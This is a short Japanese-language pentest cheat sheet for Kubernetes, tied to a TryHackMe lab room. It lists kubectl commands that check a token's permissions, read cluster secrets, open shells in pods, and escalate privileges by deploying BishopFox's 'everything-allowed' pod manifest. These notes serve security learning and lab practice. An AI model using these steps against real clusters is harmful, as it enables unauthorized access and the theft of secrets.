# Kubernetes

https://tryhackme.com/room/insekube

自分の権限を確認

```sh
kubectl auth can-i --list

kubectl auth can-i --list --token=${TOKEN}
```

secrets をgetできる場合

```sh
kubectl get secrets
```

```sh
kubectl exec -it <pod-name> --token=${TOKEN} -- /bin/bash
```

## すべてを許可する設定のPod設定

https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

```sh
kubectl apply -f privesc.yml --token=${TOKEN}

kubectl exec -it everything-allowed-exec-pod --token=${TOKEN} -- /bin/bash
```
